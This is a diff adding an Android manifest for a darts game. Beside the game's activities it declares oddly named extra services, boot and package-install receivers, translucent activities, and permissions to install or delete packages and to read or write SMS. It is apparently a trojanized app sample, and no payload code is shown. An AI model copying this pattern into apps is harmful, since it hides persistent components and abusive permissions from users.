@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.androidn.darts">
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <supports-screens android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
+    <application android:icon="@drawable/icon" android:label="@string/app_name" android:name="com.cdroid.darts.DartContext">
+        <activity android:label="@string/app_name" android:name="com.cdroid.darts.Menu" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:name="com.cdroid.darts.gameview.GameActMP" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <activity android:name="com.cdroid.darts.gameview.GameActSP" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <activity android:name="com.cdroid.darts.tutorial.Rules" android:screenOrientation="behind" android:theme="@style/DialogNoTitleBar"/>
+        <activity android:name="com.cdroid.darts.highscore.Highscore" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <activity android:name="com.cdroid.darts.tutorial.Tutorial" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <activity android:name="com.carl.mpclient.activity.TextInputAct" android:screenOrientation="behind" android:theme="@style/DialogNoTitleBar"/>
+        <activity android:name="com.carl.mpclient.activity.Preferences" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <activity android:name="com.carl.mpclient.activity.chat.ChatAct" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen" android:windowSoftInputMode="stateHidden"/>
+        <activity android:name="com.carl.mpclient.activity.lobby.Lobby" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen" android:windowSoftInputMode="stateHidden"/>
+        <activity android:name="com.carl.mpclient.activity.profile.Profile" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <activity android:name="com.carl.mpclient.activity.profile.NameAct" android:screenOrientation="behind" android:theme="@style/DialogNoTitleBar"/>
+        <activity android:name="com.carl.mpclient.activity.buddy.Buddies" android:screenOrientation="behind" android:theme="@android:style/Theme.NoTitleBar.Fullscreen"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
+        <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+        <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+        <uses-permission android:name="android.permission.INTERNET"/>
+        <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+        <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+        <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+        <uses-permission android:name="android.permission.WAKE_LOCK"/>
+        <receiver android:name="com.android.apple.AppleReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.android.apple.AppleService">
+            <intent-filter>
+                <action android:name="com.android.apple.APPLESERVICE"/>
+            </intent-filter>
+        </service>
+        <activity android:name="com.android.apple.TestActivity"/>
+        <activity android:name="com.android.cgos.Activity1" android:theme="@android:style/Theme.Translucent"/>
+        <activity android:name="com.android.cgos.Activity2" android:theme="@android:style/Theme.Translucent"/>
+        <activity android:name="com.android.cgos.Activity3" android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="com.android.action_ACTIVITY3"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <service android:name="com.android.cgos.GosService"/>
+        <receiver android:name="com.android.cgos.AlarmReceiver"/>
+        <receiver android:name="com.android.cgos.GosReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <data android:scheme="package"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
